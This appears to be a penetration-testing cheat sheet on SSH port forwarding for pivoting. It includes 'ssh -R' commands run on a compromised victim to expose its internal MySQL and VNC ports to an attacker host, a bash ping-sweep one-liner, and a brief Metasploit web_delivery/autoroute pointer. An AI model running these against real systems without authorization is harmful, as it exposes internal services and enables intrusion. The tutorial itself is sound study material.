# SSH port forwarding

Port tunneling or forwarding is a networking technique that allows traffic between ocal and remote machine.
We use port tunneling when we either canâ€™t reach a destination because it is protected behind a firewall or only accessible internally.

## Remote Forwarding
Exposing the internal services and interact with them from attacker machine.
so basically :

|Victim side|Attacker side|
|--|--|
|127.0.0.1:3306|192.168.0.106:8080|
|127.0.0.1:5900|192.168.0.106:5555|

With remote port forwarding attacker is the one listening locally for traffic from the compromised server.

`ssh -R RemortPort:localhost:localport attacker@192.168.0.106`

Commands will be ==executed on victim machine==:
```
ssh -R 8080:127.0.0.1:3306 attacker@192.168.0.106
ssh -R 5555:127.0.0.1:5900 attacker@192.168.0.106
```

## Local Forwarding
Making remote service available on local machine.
```
ssh -L local_port:remort_ip:remort_port victim@ip

ssh -L 5050:127.0.0.1:21 admin@10.10.10.90
```
means on attacker machine local port 5050 will be routed to port 21 of victim machine 10.10.10.90.


### If there is no way then use msf
****
web_delivery > autoroute > ping sweep > Will get all the internal services.

# Manual
To find out the avaiable hosts in linux we will do ping speep
`for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done`
by this simple script we will be able to find up hosts.

***So 3 ways:***
1. ssh from the machine to attacker (remote)
2. ssh from attacker to machine (local)
3. autoroute for internal ip running services.
